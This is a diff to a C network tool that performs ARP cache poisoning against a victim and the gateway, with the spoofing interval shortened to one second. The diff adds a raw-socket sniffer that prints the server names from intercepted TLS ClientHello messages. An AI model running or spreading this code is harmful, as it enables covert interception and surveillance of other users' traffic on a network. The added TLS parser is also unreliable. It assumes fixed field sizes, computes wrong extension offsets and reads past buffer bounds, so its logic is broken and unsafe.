@@ -23,6 +23,8 @@ void extract_ethernet_frame(unsigned char* , int);
 void extract_ip_header(unsigned char* buffer, int size, int pointer);
 void extract_icmp_packet(unsigned char* buffer, int size, int pointer);
 void extract_tcp_packet(unsigned char* buffer, int size, int pointer);
+void get_tls_record(unsigned char* buffer, int size);
+
 
 /* constant values */
 #define MAC_ADDR_LEN 0x06  /* MAC address length (48 bits) */
@@ -37,6 +39,8 @@ void extract_tcp_packet(unsigned char* buffer, int size, int pointer);
 #define ARP_OPER_REPLY 2  /* ARP reply */
 
 #define BUFFSIZE 65536
+#define MAX_PACKET_SIZE 65536
+
 
 /* Ethernet frame struct */
 typedef struct{
@@ -57,6 +61,40 @@ typedef struct{
     unsigned char tha[MAC_ADDR_LEN];    /* target hardware address */
     unsigned char tpa[IPv4_ADDR_LEN];   /* target protocol address */
 } arpheader_t;
+
+typedef struct __attribute__((packed)) {
+    uint8_t content_type;  // 0x16 for TLS handshake
+    uint16_t version;
+    uint16_t length;
+} TLSRecord;
+
+typedef struct __attribute__((packed)) {
+    uint8_t handshake_type;  // 0x01 for Client Hello
+    uint8_t length[3];
+    uint16_t version;
+    uint8_t random[32];  // Random data
+    uint8_t session_id_length;
+    uint8_t session_id[32];  // Session ID (variable length)
+    uint16_t cipher_suites_length;
+    uint16_t cipher_suites[16];  // Supported cipher suites (variable length)
+    uint8_t compression_methods_length;
+    uint8_t compression_methods[1];  // Supported compression methods (variable length)
+    uint16_t extensions_length;
+    uint8_t extensions[1024];  // Extensions (variable length)
+} ClientHello;
+
+typedef struct __attribute__((packed)){
+    uint16_t extension_type;        // 0x0000: server_name
+    uint16_t extension_length;
+    uint8_t extension_data[1024];
+} Extension;
+
+typedef struct __attribute__((packed)) {
+    uint16_t server_name_list_length;
+    uint8_t server_name_type;   //0x00: server name type=host_name
+    uint16_t server_name_length;
+    uint8_t server_name[256];   
+} ServerName;
 
 unsigned char localMAC[MAC_ADDR_LEN];   /* local MAC address */
 struct in_addr localIP;                 /* local IP address */
@@ -358,31 +396,35 @@ void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, co
             else{
                 printf("Send ARP reply to gateway \n");
             }
-            sleep(10);
+            sleep(1);
         }
     }
     else{       // parent process
+        int sockfd;
+        unsigned char buffer[MAX_PACKET_SIZE];
+        if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1){
+            perror("Socket creation failed.\n");
+            exit(1);
+        }
         while (1){
-            // Create a raw socket that accepts packets.
-            int r_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-            if (r_sock == -1){
-                perror("Socket creation failed. \n");
+            socklen_t saddr_size = sizeof(struct sockaddr);
+            struct sockaddr saddr;
+            memset(&buffer, 0, MAX_PACKET_SIZE);
+
+            // Receive a packet
+            int data_size = recvfrom(sockfd, buffer, MAX_PACKET_SIZE, 0, &saddr, &saddr_size);
+
+            if (data_size == -1){
+                perror("Could not receive packet");
                 exit(1);
             }
-            // Create a buffer to accept incomming packets
-            int packet_size;
-            unsigned char *buffer = (unsigned char *)malloc(65536);
-
-            packet_size = recvfrom(r_sock, buffer, 65536, 0, NULL, NULL);
-            if (packet_size == -1){
-                printf("Failed to get packet \n");
-            }
-            extract_ethernet_frame(buffer, packet_size);
+            // extract_ethernet_frame(buffer, data_size);
+            get_tls_record(buffer, data_size);
         }
+            
     }
 }
 
-int total=0;
 struct sockaddr_in source, dest;
 
 /*Ethernet Frame Structure :
@@ -468,6 +510,50 @@ void extract_icmp_packet(unsigned char* buffer, int size, int pointer){
     printf("ICMP Packet: ");
     printf("ICMP msgtype=%d, code=%d\n", icmp->type, icmp->code);
 }
+
+void get_tls_record(unsigned char* buffer, int size) {
+    // Skip the Ethernet, IP and TCP headers
+    struct ethhdr * eth = (struct ethhdr *)(buffer);
+    unsigned short ethhdrlen = sizeof(struct ethhdr);
+    struct iphdr *iph = (struct iphdr *)(buffer + ethhdrlen);
+    unsigned short iphdrlen = iph->ihl*4;
+    struct tcphdr *tcph = (struct tcphdr *)(buffer + iphdrlen + ethhdrlen);
+    unsigned short tcphdrlen = tcph->doff*4;
+
+    // Check if the packet is long enough to contain a TLS record
+    if (size < iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen) {
+        // printf("Packet is too short for a TLS record\n");
+        return;
+    }
+
+    // Get the TLS record
+    TLSRecord *tls = (TLSRecord*)(buffer + iphdrlen + tcphdrlen + ethhdrlen);
+    if(tls->content_type == 0x16){
+        // parse_client_hello(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen, size - iphdrlen - tcphdrlen - sizeof(TLSRecord) - ethhdrlen);
+        ClientHello *client_hello = (ClientHello*)(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen);
+        if (client_hello->handshake_type == 0x01){          
+            uint8_t *ptr = client_hello->extensions;
+            uint8_t *end = client_hello->extensions + ntohs(client_hello->extensions_length);
+            while (ptr < end){
+                Extension *ext = (Extension*)ptr;
+
+                if (ntohs(ext->extension_type) == 0x0000){
+                    ServerName *server_name = (ServerName*)ext->extension_data;
+                   
+                    printf("Server Name: ");
+                    for (int i = 0; i < ntohs(server_name->server_name_length); i++){
+                        printf("%c", server_name->server_name[i]);
+                    }
+                    printf("\n");
+                }
+
+                ptr += ntohs(ext->extension_length) + 4;                   
+            }
+            
+        }
+    }
+}
+
 
 
 int main(int argc, char* argv[]){
